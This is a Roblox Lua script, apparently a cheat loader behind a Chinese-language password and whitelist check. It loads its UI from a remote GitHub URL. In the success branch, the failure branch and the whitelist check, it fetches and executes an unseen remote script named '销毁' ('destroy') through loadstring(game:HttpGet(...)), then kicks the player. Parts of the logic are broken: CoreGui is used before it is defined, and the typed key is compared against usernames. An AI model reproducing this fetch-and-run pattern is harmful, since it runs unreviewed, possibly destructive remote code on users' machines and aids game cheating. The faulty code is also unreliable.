
local function notify(t, j, d)
    CoreGui:SetCore("SendNotification", {
        Title = t,
        Text = j,
        Duration = d,
    })
end

local UI = loadstring(game:HttpGet("https://raw.githubusercontent.com/kkaaccnnbb/Logan/refs/heads/main/uiilb"))()

local win = UI:new("Virtual")
local tab = win:Tab("名字")

local section = tab:section("验证卡密", true)
section:Textbox("请输入文本", 'TextBoxfalg', "文本", function(txt)
    key = txt
end)
section:Button("验证密码", function()
    if key == " 企鹅没母" then
        notify("验证成功", "企鹅没版权", 3)
        wait(5)
        loadstring(game:HttpGet("https://github.com/HKJQ3/-script/raw/refs/heads/main/销毁"))()
        wait(0.0000001)
        notify("正在加载脚本", "请稍等", 3)
        wait(1)
        notify("加载成功", "感谢使用", 3)
        wait(0.0000001)
local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://94625860335523" --音乐id
    sound.Parent = game.Workspace
    sound:Play()
    wait(10)
    game.Players.LocalPlayer:Kick("功能开发中")
    else
        notify("验证失败", "密码是 企鹅没母", 10)
        loadstring(game:HttpGet("https://github.com/HKJQ3/-script/raw/refs/heads/main/销毁"))()
        wait(1)
        loadstring(game:HttpGet("https://github.com/HKJQ3/-script/raw/refs/heads/main/销毁"))()
        wait(1)
        loadstring(game:HttpGet("https://github.com/HKJQ3/-script/raw/refs/heads/main/销毁"))()
        wait(10)
    game.Players.LocalPlayer:Kick("无权限")
    end
end)

local about = tab:section("查看")
about:Label("用户名".. game.Players.LocalPlayer.Name)

local CoreGui = game:GetService("StarterGui")
-- 定义白名单表格，存储多个白名单用户名
local whitelist = {"test1000200", "sd16488", "cfdrtdhdtff54", "ytr7279", "godpiggy27787", "436446wjhe"} -- 可根据需求添加更多用户名

-- 检查用户名是否在白名单表格中
if table.find(whitelist, key) then
    notify("验证成功", "欢迎使用", 3)
    wait(5)
    game.Players.LocalPlayer:Kick("功能开发中")
else
    notify("验证失败", "没白名单就找小叶加", 5)
    loadstring(game:HttpGet("https://github.com/HKJQ3/-script/raw/refs/heads/main/销毁"))()
    wait(1)
    loadstring(game:HttpGet("https://github.com/HKJQ3/-script/raw/refs/heads/main/销毁"))()
    wait(1)
    loadstring(game:HttpGet("https://github.com/HKJQ3/-script/raw/refs/heads/main/销毁"))()
        wait(5)
    game.Players.LocalPlayer:Kick("无权限")
end

wait(5)
-- 定义禁止的用户名列表
local forbiddenUsers = {"436446wjhe", "被禁止的用户2"}

-- 获取本地玩家用户名
local playerName = game.Players.LocalPlayer.Name

-- 检查用户名是否在禁止列表中
if table.find(forbiddenUsers, playerName) then
    game.Players.LocalPlayer:Kick("你拥有白名单但是发生未知错误❌")
end
